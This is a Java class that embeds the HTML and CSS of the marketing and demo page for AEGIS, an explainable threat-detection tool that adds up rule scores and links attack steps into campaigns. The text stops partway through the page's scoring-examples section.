package com.threatdetection.platform;

/**
 * The platform website served at "/". Generated from site/platform.html by build_page.py;
 * split into parts because a single Java string constant cannot exceed 64 KB.
 */
public final class PlatformHtml {
    private PlatformHtml() {}

    private static final String P0 = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>AEGIS - explainable threat detection</title>
<meta name="description" content="AEGIS scores every event, shows the reasons, and links attack steps into campaigns.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root{
  --paper:#EEF2F6; --surface:#FFFFFF; --ink:#0C1A28; --soft:#46566A; --faint:#7A8A9C; --hair:#D2DAE3; --hair2:#E4EAF0;
  --brand:#0B6E75; --brand-d:#07545A; --brand-bg:#E3F1F2;
  --violet:#5B4FD1; --violet-bg:#ECEAFB;
  --safe:#2F9E5B; --low:#2F80D1; --med:#C99700; --high:#E0600D; --crit:#D63A3F;
  --con:#0C1A28; --con2:#132639; --conline:#27425D; --context:#DCE6F2; --conmut:#8FA7BF;
  --dsafe:#4CC17D; --dlow:#5AA7F0; --dmed:#F2BE2E; --dhigh:#FF8A3D; --dcrit:#FF5A5F; --dviolet:#A79CFF; --dbrand:#4CC9D2;
  --sans:"Archivo","Bahnschrift","Segoe UI",system-ui,-apple-system,Roboto,Helvetica,Arial,sans-serif;
  --mono:"JetBrains Mono","Cascadia Mono",Consolas,"SF Mono",Menlo,monospace;
  --wrap:1180px;
}
*{box-sizing:border-box}
html{scroll-behavior:smooth;scroll-padding-top:72px}
body{margin:0;background:var(--paper);color:var(--ink);font:400 16px/1.6 var(--sans);-webkit-font-smoothing:antialiased}
a{color:var(--brand-d)}
a:hover{color:var(--brand)}
:focus-visible{outline:3px solid #2B8CFF;outline-offset:2px;border-radius:2px}
button,select,input,textarea{font:inherit;color:inherit}
code,.mono{font-family:var(--mono);font-size:.86em}
h1,h2,h3{margin:0;line-height:1.12;letter-spacing:-.015em}
h1{font-size:clamp(2.2rem,4.6vw,3.7rem);font-weight:800;letter-spacing:-.025em}
h2{font-size:clamp(1.5rem,2.6vw,2.05rem);font-weight:700}
h3{font-size:1.06rem;font-weight:700;letter-spacing:-.005em}
p{margin:0 0 1em}
.wrap{max-width:var(--wrap);margin:0 auto;padding:0 24px}
.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
.mut{color:var(--soft)}
.small{font-size:.86rem}
.tiny{font-size:.76rem}

/* ---------- top bar ---------- */
.bar{position:sticky;top:0;z-index:50;background:rgba(238,242,246,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--hair)}
.bar .wrap{display:flex;align-items:center;gap:20px;height:56px}
.brand{font-weight:800;letter-spacing:.14em;font-size:1.05rem;color:var(--ink);text-decoration:none;display:flex;align-items:center;gap:10px}
.brand svg{display:block}
.nav{display:flex;gap:4px;overflow-x:auto;scrollbar-width:none;flex:1}
.nav a{padding:6px 10px;border-radius:4px;color:var(--soft);text-decoration:none;font-weight:500;font-size:.92rem;white-space:nowrap}
.nav a:hover{background:var(--hair2);color:var(--ink)}
.pill{display:inline-flex;align-items:center;gap:8px;padding:4px 10px;border:1px solid var(--hair);border-radius:99px;background:var(--surface);font-size:.8rem;font-weight:600;white-space:nowrap}
.dot{width:8px;height:8px;border-radius:50%;background:var(--faint);display:inline-block;flex:none}
.dot.on{background:var(--safe)}
.dot.off{background:var(--crit)}
.btn{display:inline-flex;align-items:center;gap:8px;padding:9px 16px;border-radius:4px;border:1px solid var(--ink);background:var(--ink);color:#fff;font-weight:600;text-decoration:none;cursor:pointer;font-size:.95rem}
.btn:hover{background:#1a2f45;color:#fff}
.btn.alt{background:transparent;color:var(--ink)}
.btn.alt:hover{background:var(--surface);color:var(--ink)}
.btn.sm{padding:5px 10px;font-size:.82rem}
.btn[disabled]{opacity:.5;cursor:not-allowed}
.btn.on-dark{background:var(--dbrand);border-color:var(--dbrand);color:#04252A}
.btn.on-dark:hover{background:#7fe0e7;color:#04252A}
.btn.ghost-dark{background:transparent;border-color:var(--conline);color:var(--context)}
.btn.ghost-dark:hover{background:var(--con2);color:#fff}

/* ---------- hero ---------- */
.hero{padding:56px 0 64px;border-bottom:1px solid var(--hair)}
.hero .wrap{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,1fr);gap:48px;align-items:center}
.hero h1{margin-bottom:20px}
.lead{font-size:1.14rem;line-height:1.55;color:var(--soft);max-width:34em;margin-bottom:28px}
.cta{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:28px}
.proof-row{display:flex;gap:28px;flex-wrap:wrap;color:var(--soft);font-size:.9rem;border-top:1px solid var(--hair);padding-top:16px}
.proof-row b{color:var(--ink);font-weight:700}

/* ---------- instrument (dark panels) ---------- */
.inst{background:var(--con);color:var(--context);border-radius:6px;overflow:hidden;border:1px solid #0a1520;box-shadow:0 1px 0 rgba(255,255,255,.04) inset}
.inst-h{display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:1px solid var(--conline);font-size:.8rem;color:var(--conmut)}
.inst-h b{color:var(--context);font-weight:600;font-size:.86rem}
.inst-h .sp{flex:1}
.inst-b{padding:16px}
.actor{display:flex;flex-wrap:wrap;gap:8px 12px;align-items:baseline;margin-bottom:4px}
.actor .ip{font:700 1.15rem var(--mono);color:#fff}
.evsum{color:var(--conmut);font-size:.88rem;margin-bottom:16px;word-break:break-word}

/* ruler */
.ruler{position:relative;margin:26px 0 26px}
.ruler-track{display:flex;height:22px;border-radius:3px;overflow:hidden;position:relative}
.ruler-track i{display:block;height:100%;font-style:normal;font-size:.62rem;line-height:22px;text-align:center;color:rgba(0,0,0,.62);font-weight:700;overflow:hidden;letter-spacing:.02em}
.ruler-track i.safe{background:var(--dsafe)}.ruler-track i.low{background:var(--dlow)}.ruler-track i.med{background:var(--dmed)}.ruler-track i.high{background:var(--dhigh)}.ruler-track i.crit{background:var(--dcrit)}
.light .ruler-track i.safe{background:#BFE5CD}.light .ruler-track i.low{background:#BFD8F3}.light .ruler-track i.med{background:#F1DFA3}.light .ruler-track i.high{background:#F7C9A5}.light .ruler-track i.crit{background:#F2B9BB}
.light .ruler-track i{color:rgba(12,26,40,.7)}
.ruler-ticks{position:relative;height:16px;margin-top:3px;font:500 .68rem var(--mono);color:var(--conmut)}
.light .ruler-ticks{color:var(--faint)}
.ruler-ticks span{position:absolute;transform:translateX(-50%)}
.needle{position:absolute;top:-8px;bottom:18px;width:0;left:0%;transition:left .55s cubic-bezier(.2,.8,.2,1)}
.needle::before{content:"";position:absolute;left:-1px;top:6px;bottom:0;width:2px;background:#fff;box-shadow:0 0 0 1px rgba(0,0,0,.35)}
.light .needle::before{background:var(--ink);box-shadow:0 0 0 1px rgba(255,255,255,.7)}
.needle b{position:absolute;left:0;top:-16px;transform:translateX(-50%);background:#fff;color:#0C1A28;font:700 .76rem var(--mono);padding:1px 6px;border-radius:3px;white-space:nowrap}
.light .needle b{background:var(--ink);color:#fff}

/* ledger of rule contributions */
.ledger{width:100%;border-collapse:collapse;font-size:.86rem}
.ledger td{padding:5px 8px 5px 0;vertical-align:top;border-top:1px solid var(--conline)}
.ledger tr:first-child td{border-top:0}
.ledger .pts{font:700 .88rem var(--mono);text-align:right;width:46px;color:#fff;white-space:nowrap}
.ledger .rn{white-space:nowrap}
.ledger .dt{color:var(--conmut);font-size:.82rem;word-break:break-word}
.ledger tfoot td{border-top:2px solid var(--conmut);padding-top:7px}
.light .ledger td{border-top-color:var(--hair2)}
.light .ledger .pts{color:var(--ink)}
.light .ledger .dt{color:var(--soft)}
.light .ledger tfoot td{border-top-color:var(--ink)}
.verdict{margin-top:14px;padding:10px 12px;border-radius:4px;font-weight:600;font-size:.92rem;display:flex;gap:10px;align-items:baseline;flex-wrap:wrap}
.verdict.v-safe{background:rgba(76,193,125,.14);color:var(--dsafe)}
.verdict.v-low{background:rgba(90,167,240,.14);color:var(--dlow)}
.verdict.v-medium{background:rgba(242,190,46,.14);color:var(--dmed)}
.verdict.v-high{background:rgba(255,138,61,.14);color:var(--dhigh)}
.verdict.v-critical{background:rgba(255,90,95,.16);color:var(--dcrit)}
.empty{padding:28px 8px;text-align:center;color:var(--conmut);font-size:.92rem}
.light .empty{color:var(--soft)}

/* chips and badges */
.chip{display:inline-block;padding:1px 7px;border-radius:3px;font:600 .74rem var(--mono);border:1px solid;white-space:nowrap;line-height:1.5}
.chip.core{color:var(--dbrand);border-color:rgba(76,201,210,.5);background:rgba(76,201,210,.08)}
.chip.aegis{color:var(--dviolet);border-color:rgba(167,156,255,.55);background:rgba(167,156,255,.1)}
.light .chip.core,.chip.core.lt{color:var(--brand-d);border-color:rgba(11,110,117,.45);background:var(--brand-bg)}
.light .chip.aegis,.chip.aegis.lt{color:var(--violet);border-color:rgba(91,79,209,.4);background:var(--violet-bg)}
.lvl{display:inline-block;padding:1px 8px;border-radius:3px;font-weight:700;font-size:.72rem;letter-spacing:.04em;white-space:nowrap}
.lvl.SAFE{background:rgba(76,193,125,.18);color:var(--dsafe)}.lvl.LOW{background:rgba(90,167,240,.18);color:var(--dlow)}.lvl.MEDIUM{background:rgba(242,190,46,.18);color:var(--dmed)}.lvl.HIGH{background:rgba(255,138,61,.18);color:var(--dhigh)}.lvl.CRITICAL{background:rgba(255,90,95,.2);color:var(--dcrit)}
.light .lvl.SAFE{color:var(--safe);background:#DDF2E5}.light .lvl.LOW{color:var(--low);background:#DFEBF8}.light .lvl.MEDIUM{color:#8F6B00;background:#F8EDC4}.light .lvl.HIGH{color:var(--high);background:#FBE0CC}.light .lvl.CRITICAL{color:var(--crit);background:#F8D7D8}
.src{display:inline-block;padding:0 7px;border-radius:3px;font-weight:600;font-size:.72rem;border:1px solid;line-height:1.55;white-space:nowrap}
.src.OBSERVED{color:var(--dsafe);border-color:var(--dsafe)}
.src.API{color:var(--dlow);border:1px dashed var(--dlow)}
.src.SIMULATED{color:var(--dviolet);border:1px dotted var(--dviolet)}
.light .src.OBSERVED{color:var(--safe);border-color:var(--safe)}.light .src.API{color:var(--low);border-color:var(--low)}.light .src.SIMULATED{color:var(--violet);border-color:var(--violet)}
.tag{display:inline-block;padding:0 7px;border-radius:3px;background:var(--hair2);color:var(--soft);font-size:.74rem;font-weight:600;line-height:1.6;white-space:nowrap}
.dark .tag{background:#1d3550;color:var(--context)}

/* ---------- sections ---------- */
section.s{padding:72px 0;border-bottom:1px solid var(--hair)}
section.s.tight{padding:56px 0}
.sh{display:grid;grid-template-columns:minmax(0,4fr) minmax(0,8fr);gap:48px;margin-bottom:36px}
.sh p{color:var(--soft);margin:0;max-width:44em}
.sh .kick{font-weight:600;color:var(--brand-d);font-size:.86rem;margin-bottom:8px}
.cols{display:grid;grid-template-columns:minmax(0,4fr) minmax(0,8fr);gap:48px}
.cols.even{grid-template-columns:1fr 1fr}

/* comparison table */
.tbl-wrap{overflow-x:auto;background:var(--surface);border:1px solid var(--hair);border-radius:4px}
table.t{width:100%;border-collapse:collapse;font-size:.92rem}
table.t th{background:#F6F8FA;text-align:left;font-weight:700;font-size:.8rem;color:var(--soft);padding:10px 14px;border-bottom:1px solid var(--hair);position:sticky;top:0;z-index:1;white-space:nowrap}
table.t td{padding:11px 14px;border-bottom:1px solid var(--hair2);vertical-align:top}
table.t tr:last-child td{border-bottom:0}
table.t td.k{font-weight:600;white-space:nowrap;color:var(--ink)}
table.t td.us{background:rgba(11,110,117,.05)}
table.t.compact td,table.t.compact th{padding:8px 12px}
.scroll-y{max-height:460px;overflow:auto}

/* stepper */
.stepper{display:grid;grid-template-columns:minmax(0,5fr) minmax(0,7fr);gap:0;background:var(--surface);border:1px solid var(--hair);border-radius:4px;overflow:hidden}
.steps{list-style:none;margin:0;padding:0;border-right:1px solid var(--hair)}
.steps li{margin:0}
.steps button{display:flex;gap:14px;width:100%;text-align:left;padding:14px 18px;background:none;border:0;border-bottom:1px solid var(--hair2);cursor:pointer;align-items:baseline}
.steps li:last-child button{border-bottom:0}
.steps button:hover{background:#F6F8FA}
.steps button[aria-selected="true"]{background:var(--brand-bg);box-shadow:inset 3px 0 0 var(--brand)}
.steps .n{font:700 .86rem var(--mono);color:var(--brand-d);width:20px;flex:none}
.steps .tt{font-weight:700}
.steps .ss{display:block;color:var(--soft);font-size:.86rem;font-weight:400}
.step-d{padding:24px 28px}
.step-d h3{font-size:1.25rem;margin-bottom:10px}
.step-d dl{margin:18px 0 0;display:grid;grid-template-columns:120px 1fr;gap:10px 16px;font-size:.92rem}
.step-d dt{font-weight:700;color:var(--soft)}
.step-d dd{margin:0}
.step-d .codes code{display:inline-block;background:#F1F4F7;border:1px solid var(--hair);padding:0 6px;border-radius:3px;margin:0 6px 6px 0}

/* examples under the scoring ruler */
.examples{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:0;border:1px solid var(--hair);background:var(--surface);border-radius:4px;overflow:hidden}
.ex{padding:20px 22px;border-right:1px solid var(--hair)}
.ex:last-child{border-right:0}
.ex h3{margin-bottom:6px}
.ex .sum{font:700 .88rem var(--mono);margin:6px 0 10px}
.ex .sum span{color:var(--soft);font-weight:500}
.ex p{font-size:.9rem;color:var(--soft);margin-bottom:12px}
.bandlist{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:0;margin-top:6px;border:1px solid var(--hair);background:var(--surface);border-radius:4px;overflow:hidden}
.bandlist div{padding:12px 14px;border-right:1px solid var(--hair);font-size:.84rem;color:var(--soft)}
.bandlist div:last-child{border-right:0}
.bandlist b{display:block;color:var(--ink);font-size:.88rem;margin-bottom:2px}
.bandlist .r{font:600 .78rem var(--mono);color:var(--ink)}

/* filters */
.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;align-items:center}
.filters input,.filters select,.fld input,.fld select,.fld textarea{background:var(--surface);border:1px solid var(--hair);border-radius:4px;padding:7px 10px;min-width:0}
.filters input[type=search]{flex:1;min-width:200px}
.pts-cell{font:700 .86rem var(--mono);white-space:nowrap}
.rule-id{font:700 .8rem var(--mono);white-space:nowrap}
.caution{color:var(--soft);font-size:.86rem}
.tech{font-size:.82rem;color:var(--soft)}

/* attack chain */
.chain{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:0;position:relative;margin-bottom:28px}
.chain .node{padding:0 12px 0 0;position:relative}
.chain .node::before{content:"";position:absolute;left:0;right:0;top:11px;height:2px;background:var(--hair)}
.chain .node .dotn{position:relative;width:24px;height:24px;border-radius:50%;background:var(--surface);border:2px solid var(--ink);display:block;margin-bottom:12px;z-index:1;font:700 .72rem/20px var(--mono);text-align:center}
.chain .node h3{font-size:.98rem;margin-bottom:4px}
.chain .node p{font-size:.84rem;color:var(--soft);margin-bottom:6px}
.chain .node .cnt{display:block;font-size:.8rem;font-weight:600;color:var(--brand-d)}
.formula{background:var(--surface);border:1px solid var(--hair);border-radius:4px;padding:20px 22px}
.formula ol{margin:0 0 14px;padding-left:20px}
.formula li{margin-bottom:6px}
.formula .eq{font:500 .88rem/1.7 var(--mono);background:#F1F4F7;border:1px solid var(--hair);border-radius:4px;padding:10px 14px;overflow-x:auto;white-space:pre}
.note{border-left:3px solid var(--med);background:#FBF5E0;padding:10px 14px;font-size:.9rem;border-radius:0 4px 4px 0;margin:16px 0}
.note.info{border-left-color:var(--brand);background:var(--brand-bg)}
.stg{display:inline-flex;gap:3px;vertical-align:middle}
.stg i{width:16px;height:16px;border-radius:3px;background:var(--hair2);border:1px solid var(--hair);display:inline-block}
.stg i.on{background:var(--brand);border-color:var(--brand)}
.dark .stg i{background:#1d3550;border-color:var(--conline)}
.dark .stg i.on{background:var(--dbrand);border-color:var(--dbrand)}
.meter{position:relative;height:10px;background:var(--hair2);border-radius:3px;min-width:120px}
.meter i{display:block;height:100%;border-radius:3px;background:var(--low)}
.meter i.escalate{background:var(--high)}.meter i.block{background:var(--crit)}
.meter u{position:absolute;top:-3px;bottom:-3px;width:1px;background:var(--ink);opacity:.5;text-decoration:none}
.dark .meter{background:#1d3550}.dark .meter u{background:#fff}
.act{font-weight:700;font-size:.78rem}
.act.BLOCK{color:var(--crit)}.act.ESCALATE{color:var(--high)}.act.WATCH{color:var(--soft)}
.dark .act.BLOCK{color:var(--dcrit)}.dark .act.ESCALATE{color:var(--dhigh)}.dark .act.WATCH{color:var(--conmut)}
.missed{color:var(--crit);font-weight:600;font-size:.8rem}

/* lab */
.lab{display:grid;grid-template-columns:minmax(0,3.4fr) minmax(0,8.6fr);gap:0;border:1px solid #0a1520;border-radius:6px;overflow:hidden;background:var(--con);color:var(--context)}
.lab-side{border-right:1px solid var(--conline);padding:6px 0;background:#0F2033}
.lab-side h3{padding:12px 16px 4px;font-size:.78rem;color:var(--conmut);font-weight:600}
.sc{display:block;width:100%;text-align:left;background:none;border:0;border-left:3px solid transparent;color:var(--context);padding:11px 16px;cursor:pointer}
.sc:hover{background:var(--con2)}
.sc[aria-pressed="true"]{background:var(--con2);border-left-color:var(--dbrand)}
.sc b{display:block;font-weight:700;font-size:.92rem}
.sc span{display:block;color:var(--conmut);font-size:.8rem;line-height:1.4;margin-top:2px}
.sc .star{color:var(--dmed);font-size:.74rem;font-weight:700}
.lab-main{min-width:0;display:flex;flex-direction:column}
.lab-top{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:0;border-bottom:1px solid var(--conline)}
.lab-top>div{padding:16px}
.lab-top>div+div{border-left:1px solid var(--conline)}
.lab-top h4{margin:0 0 10px;font-size:.78rem;color:var(--conmut);font-weight:600}
.lab-bar{display:flex;gap:10px;align-items:center;padding:10px 16px;border-bottom:1px solid var(--conline);flex-wrap:wrap}
.lab-bar .ip{font:700 .95rem var(--mono);color:#fff}
.lab-bar .sp{flex:1}
.log{max-height:330px;overflow:auto;font-size:.84rem}
.log table{width:100%;border-collapse:collapse}
.log td{padding:6px 10px;border-bottom:1px solid #1b3249;vertical-align:top}
.log tr{cursor:pointer}
.log tr:hover td{background:var(--con2)}
.log tr.sel td{background:#183049}
.log .n{font:500 .76rem var(--mono);color:var(--conmut);width:34px}
.log .act-t{font:500 .8rem var(--mono);color:var(--context);word-break:break-all}
.log .sc-t{text-align:right;white-space:nowrap;font:700 .84rem var(--mono)}
.final{padding:16px;border-top:1px solid var(--conline);background:#0F2033}
.final h4{margin:0 0 6px;font-size:.78rem;color:var(--conmut);font-weight:600}
.final .big{font-size:1.04rem;line-height:1.5}
.final .big b{color:#fff}
details.custom{border-top:1px solid var(--conline);padding:10px 16px}
details.custom summary{cursor:pointer;font-weight:600;font-size:.88rem;color:var(--context)}
.fld{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin:12px 0}
.fld label{display:block;font-size:.76rem;color:var(--conmut);margin-bottom:3px}
.fld input,.fld select{width:100%;background:#0b1826;border-color:var(--conline);color:var(--context)}

/* live */
.dark{background:var(--con);color:var(--context);border-bottom:0}
.dark h2{color:#fff}
.dark .sh p,.dark .mut{color:var(--conmut)}
.dark .sh .kick{color:var(--dbrand)}
.dark a{color:var(--dbrand)}
.kpis{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));border:1px solid var(--conline);border-radius:4px;margin-bottom:20px;background:var(--con2)}
.kpi{padding:14px 18px;border-right:1px solid var(--conline)}
.kpi:last-child{border-right:0}
.kpi .v{font:700 1.7rem/1.1 var(--mono);color:#fff}
.kpi .l{font-size:.8rem;color:var(--conmut);margin-top:2px}
.live-grid{display:grid;grid-template-columns:minmax(0,7fr) minmax(0,5fr);gap:20px;margin-bottom:20px}
.panel{background:var(--con2);border:1px solid var(--conline);border-radius:4px;padding:16px;min-width:0}
.panel h3{font-size:.86rem;color:var(--conmut);font-weight:600;margin-bottom:12px;display:flex;gap:10px;align-items:baseline;flex-wrap:wrap}
.panel h3 .sp{flex:1}
canvas.chart{width:100%;height:330px;display:block}
.legend{display:flex;gap:14px;flex-wrap:wrap;font-size:.76rem;color:var(--conmut);margin-top:8px}
.legend i{display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:5px;vertical-align:-1px}
.hbar{display:grid;grid-template-columns:150px minmax(0,1fr) 96px;gap:10px;align-items:center;font-size:.82rem;margin-bottom:7px}
.hbar .nm{font:600 .76rem var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.hbar .tr{height:10px;background:#1d3550;border-radius:2px;overflow:hidden}
.hbar .tr i{display:block;height:100%}
.hbar .tr i.core{background:var(--dbrand)}.hbar .tr i.aegis{background:var(--dviolet)}
.hbar .ct{color:var(--conmut);text-align:right;font-size:.76rem}
.srcrow{display:flex;gap:10px;align-items:baseline;padding:7px 0;border-bottom:1px solid #1b3249;font-size:.86rem}
.srcrow:last-child{border-bottom:0}
.srcrow .nm{font-weight:600;min-width:130px}
.srcrow .dt{color:var(--conmut);flex:1;font-size:.8rem;overflow:hidden;text-overflow:ellipsis}
.srcrow .dot.on{background:var(--dsafe)}.srcrow .dot.wait{background:var(--dmed)}.srcrow .dot.err{background:var(--dcrit)}
.feed{max-height:420px;overflow:auto}
.feed table{width:100%;border-collapse:collapse;font-size:.86rem}
.feed th{position:sticky;top:0;background:var(--con2);text-align:left;color:var(--conmut);font-weight:600;font-size:.76rem;padding:6px 10px;border-bottom:1px solid var(--conline)}
.feed td{padding:7px 10px;border-bottom:1px solid #1b3249;vertical-align:top}
.feed tr.row{cursor:pointer}
.feed tr.row:hover td{background:#183049}
.feed tr.x td{background:#0F2033;padding:12px 16px}
.feed .ip{font:600 .82rem var(--mono)}
.feed .chips{display:flex;gap:5px;flex-wrap:wrap}

/* proof */
.score-banner{display:flex;gap:16px;align-items:center;flex-wrap:wrap;background:var(--surface);border:1px solid var(--hair);border-radius:4px;padding:14px 18px;margin-bottom:12px}
.score-banner .big{font:800 1.8rem/1 var(--mono)}
.score-banner .big.ok{color:var(--safe)}.score-banner .big.bad{color:var(--crit)}
.res{font-weight:700;font-size:.8rem;white-space:nowrap}
.res.pass{color:var(--safe)}.res.fail{color:var(--crit)}
.kind{display:inline-block;padding:0 7px;border-radius:3px;font-size:.74rem;font-weight:600;border:1px solid var(--hair);background:var(--surface);white-space:nowrap}
.kind.attack{color:var(--crit);border-color:#EBB9BB}.kind.benign{color:var(--safe);border-color:#B7DEC6}.kind.known-limit{color:#8F6B00;border-color:#E6D28F;background:#FBF5E0}
.lines{margin:0;padding-left:18px}
.lines li{margin-bottom:8px}
.cmd{background:var(--con);color:var(--context);border-radius:4px;padding:14px 16px;font:500 .84rem/1.7 var(--mono);overflow-x:auto;white-space:pre;margin:0 0 14px}
.cmd i{color:var(--conmut);font-style:normal}
.two{display:grid;grid-template-columns:1fr 1fr;gap:36px}
.two h3{margin-bottom:10px}
.cl{list-style:none;margin:0;padding:0}
.cl li{padding:9px 0;border-bottom:1px solid var(--hair);display:grid;grid-template-columns:96px 1fr;gap:12px}
.cl li:last-child{border-bottom:0}
.cl b{font-size:.8rem;color:var(--soft)}
.cl .st{font-size:.76rem;font-weight:700}
.cl .st.done{color:var(--safe)}.cl .st.next{color:var(--brand-d)}
footer{padding:36px 0 56px;color:var(--soft);font-size:.9rem}
footer .wrap{display:flex;gap:24px;flex-wrap:wrap;justify-content:space-between}
footer a{margin-right:16px}
.banner{display:none;background:#FBE9E9;border-bottom:1px solid #EBB9BB;color:#8E1F24;padding:10px 24px;text-align:center;font-weight:600;font-size:.9rem}
.banner.show{display:block}

@media (max-width:980px){
  .hero .wrap,.sh,.cols,.two,.stepper,.live-grid,.lab,.lab-top{grid-template-columns:1fr}
  .hero .wrap{gap:32px}.sh{gap:12px}
  .steps{border-right:0;border-bottom:1px solid var(--hair)}
  .lab-side{border-right:0;border-bottom:1px solid var(--conline)}
  .lab-top>div+div{border-left:0;border-top:1px solid var(--conline)}
""";

    private static final String P1 = """
  .examples,.bandlist{grid-template-columns:1fr}.ex,.bandlist div{border-right:0;border-bottom:1px solid var(--hair)}
  .chain{grid-template-columns:1fr;gap:18px}.chain .node::before{display:none}
  .kpis{grid-template-columns:repeat(2,minmax(0,1fr))}.kpi{border-bottom:1px solid var(--conline)}
  .pill.status{display:none}
  .hbar{grid-template-columns:110px minmax(0,1fr) 56px}
  .step-d dl{grid-template-columns:1fr;gap:2px}.step-d dt{margin-top:8px}
}
@media (prefers-reduced-motion:reduce){
  html{scroll-behavior:auto}
  .needle{transition:none}
}
.lab.dark{border-bottom:0}
.lab .chip.core{color:var(--dbrand)}
.inst .mut,.lab .mut,.inst .tiny.mut{color:var(--conmut)}
.feed td:first-child{white-space:nowrap}
h1{font-size:clamp(2.1rem,4vw,3.3rem)}
#bandRuler .needle{display:none}

</style>
</head>
<body>
<div class="banner" id="offline" role="alert">The engine is not reachable. Start it with <code>java -cp out com.threatdetection.Main</code> and reload this page.</div>

<header class="bar">
  <div class="wrap">
    <a class="brand" href="#top" aria-label="AEGIS home">
      <svg width="22" height="24" viewBox="0 0 22 24" aria-hidden="true"><path d="M11 1.5 20 5v7.2c0 5.2-3.7 9-9 10.8C5.7 21.200 2 17.400 2 12.200V5z" fill="none" stroke="#0C1A28" stroke-width="2" stroke-linejoin="round"/><path d="M6 13h10" stroke="#0B6E75" stroke-width="2"/><path d="M12.500 9v8" stroke="#0C1A28" stroke-width="2"/></svg>
      AEGIS
    </a>
    <nav class="nav" aria-label="Sections">
      <a href="#why">Why</a><a href="#logic">How it decides</a><a href="#rules">Rules</a><a href="#campaigns">Campaigns</a><a href="#lab">Attack lab</a><a href="#live">Live</a><a href="#proof">Proof</a><a href="#impact">Run it</a>
    </nav>
    <span class="pill status" id="status"><span class="dot" id="statusDot"></span><span id="statusText">Connecting</span></span>
    <a class="btn sm alt" href="/aegis">SOC console</a>
    <a class="btn sm alt" href="/map">Threat map</a>
  </div>
</header>

<main id="top">
<section class="hero">
  <div class="wrap">
    <div>
      <h1>Every request gets a score. Every score shows its reasons.</h1>
      <p class="lead">AEGIS reads web logs, firewall logs and Windows events, adds up the evidence from <span id="ruleCount">36</span> detection rules, and blocks an address only when the evidence is strong. Then it links the steps of an attack together, so a slow and quiet intruder is still caught.</p>
      <div class="cta">
        <a class="btn" href="#lab">Launch an attack</a>
        <a class="btn alt" href="#logic">See how it decides</a>
      </div>
      <div class="proof-row">
        <span><b id="heroCases">&ndash;</b> verification cases pass</span>
        <span><b>5</b> data sources</span>
        <span><b>0</b> cloud calls, <b>0</b> API keys</span>
      </div>
    </div>
    <div class="inst" aria-live="polite">
      <div class="inst-h"><b>Latest decision</b><span class="sp"></span><span id="heroWhen">waiting for traffic</span></div>
      <div class="inst-b" id="hero"><div class="empty">Waiting for traffic. The built-in simulator produces events every second or so.</div></div>
    </div>
  </div>
</section>

<section class="s" id="why">
  <div class="wrap">
    <div class="sh">
      <div><h2>Why a simple rule checker is not enough</h2></div>
      <p>Most student projects stop at &ldquo;if failed logins &gt; 5 then block&rdquo;. That is easy to dodge and impossible to explain. AEGIS is built around two questions a security analyst actually asks: <em>why was this flagged?</em> and <em>is this one step of something bigger?</em></p>
    </div>
    <div class="tbl-wrap">
      <table class="t">
        <thead><tr><th></th><th>Single-rule checker</th><th>AEGIS</th></tr></thead>
        <tbody>
          <tr><td class="k">How it decides</td><td>One rule fires, then block or ignore.</td><td class="us">Points from many independent rules are added into one score. The block line is 101.</td></tr>
          <tr><td class="k">Explanation</td><td>&ldquo;Blocked by rule 7.&rdquo;</td><td class="us">Every event lists each rule, its points and the evidence it saw.</td></tr>
          <tr><td class="k">Slow, multi-step attacks</td><td>Each step looks harmless alone, so nothing is caught.</td><td class="us">Steps are linked per attacker across a 5-stage attack chain, with older evidence fading out.</td></tr>
          <tr><td class="k">Data sources</td><td>One log type.</td><td class="us">Web access logs, firewall logs, Windows Security log, Sysmon, and an HTTP API.</td></tr>
          <tr><td class="k">Honesty about data</td><td>Demo data and real data are mixed together.</td><td class="us">Every event is labelled Observed, API or Simulated. An unknown reputation is &ldquo;no data&rdquo;, never &ldquo;clean&rdquo;.</td></tr>
          <tr><td class="k">Proof it works</td><td>&ldquo;Trust me.&rdquo;</td><td class="us">A built-in self-test runs <span id="whyCases">65</span> cases against the live rule code, including documented false positives.</td></tr>
        </tbody>
      </table>
    </div>
  </div>
</section>

<section class="s" id="logic">
  <div class="wrap">
    <div class="sh">
      <div><h2>How one event becomes a decision</h2></div>
      <p>Six steps, each in its own part of the code. Pick a step to see what happens and where to find it. A judge who asks &ldquo;show me the code&rdquo; gets a file name, not a promise.</p>
    </div>
    <div class="stepper">
      <ol class="steps" id="steps" role="tablist" aria-label="Decision steps"></ol>
      <div class="step-d" id="stepDetail" role="tabpanel"></div>
    </div>

    <div class="cols" style="margin-top:64px">
      <div>
        <h2>The scoring model</h2>
      </div>
      <div>
        <p class="mut">The score is the sum of the points from every rule that fired. Because no single weak signal can reach 101 on its own, one noisy rule cannot block an innocent user. An attacker has to stay under <em>every</em> threshold at once to avoid it.</p>
        <div class="light" id="bandRuler" style="margin:6px 0 12px"></div>
        <div class="bandlist" id="bandList"></div>
      </div>
    </div>

    <div class="examples" style="margin-top:36px">
      <div class="ex">
        <h3>One attack, nothing else</h3>
        <div class="sum">+40 <span>SQL_INJECTION</span></div>
        <div class="light" data-ruler="40"></div>
        <p>A SQL injection from an ordinary address using a normal browser. Logged and shown, not blocked. Proportionate.</p>
        <button class="btn sm alt" data-scn="sqli">Run it</button>
      </div>
      <div class="ex">
        <h3>Evidence stacks up</h3>
        <div class="sum">+50 +15 +40 <span>= 105</span></div>
        <div class="light" data-ruler="105"></div>
